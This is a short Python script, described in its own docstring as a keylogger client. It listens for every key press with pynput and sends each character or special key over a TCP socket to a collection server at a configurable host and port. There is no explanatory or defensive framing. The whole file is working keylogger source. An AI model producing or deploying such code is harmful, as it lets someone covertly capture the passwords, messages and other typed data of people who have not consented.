import socket
from pynput import keyboard

HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 65432        # The port used by the server

def on_press(key):
    """
    Callback function to handle key presses.
    Sends the key pressed to the server.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            try:
                s.sendall(str(key.char).encode())
            except AttributeError:
                s.sendall(f" [{key}] ".encode())
    except ConnectionRefusedError:
        print("Server is not running. Please start the server first.")

def main():
    """Main function to start the keylogger client."""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
